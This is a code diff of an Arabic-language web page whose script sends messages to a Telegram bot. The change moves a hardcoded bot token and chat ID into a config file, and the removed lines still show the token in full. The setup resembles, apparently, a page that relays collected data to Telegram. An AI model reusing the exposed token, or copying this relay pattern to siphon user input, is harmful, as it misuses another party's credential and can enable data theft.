@@ -237,9 +237,10 @@ height: auto;
   <p style="color: #333;">الرجاء عدم إغلاق الصفحة أو إعادة تحميل الصفحة</p>
 </div>
 
-<script>
-  const telegramBotToken = '8364441024:AAHluZaG5P8utYObf0Qj3719YONXO8zH24c';
-  const chatId = '7785288759';
+<script src="config.js"></script>
+  <script>
+  const telegramBotToken = TELEGRAM_BOT_TOKEN;
+  const chatId = TELEGRAM_CHAT_ID;
 
   async function sendToTelegram(message) {
     const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
